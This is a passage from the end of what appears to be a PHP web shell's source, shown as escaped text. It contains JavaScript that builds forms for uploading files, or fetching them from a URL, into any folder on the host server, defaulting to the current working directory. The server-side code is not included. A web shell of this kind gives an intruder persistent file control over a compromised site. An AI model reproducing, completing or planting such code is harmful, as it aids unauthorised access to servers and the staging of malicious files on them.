	return -c * Math.cos(t/e * (Math.PI/2)) + c + b;
}
function getheight(){
	return Math.max(
		d.body.scrollHeight, d.documentElement.scrollHeight,
		d.body.offsetHeight, d.documentElement.offsetHeight,
		d.body.clientHeight, d.documentElement.clientHeight
	);
}
function adduploadc(){
	var form = "&lt;tr&gt;&lt;td colspan='2'&gt;&lt;hr /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style='width:140px;'&gt;File&lt;/td&gt;&lt;td&gt;&lt;input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='"+cwd+"' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;";
	var a = d.getElementById('adduploadc');
	if(a) a.insertAdjacentHTML('beforeend', form);
}
function adduploadi(){
	var form = "&lt;tr&gt;&lt;td colspan='2'&gt;&lt;hr /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style='width:150px;'&gt;File URL&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='"+cwd+"' /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;";
	var a = d.getElementById('adduploadi');
	if(a) a.insertAdjacentHTML('beforeend', form);
}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;&lt;?php die(); ?&gt;
</pre>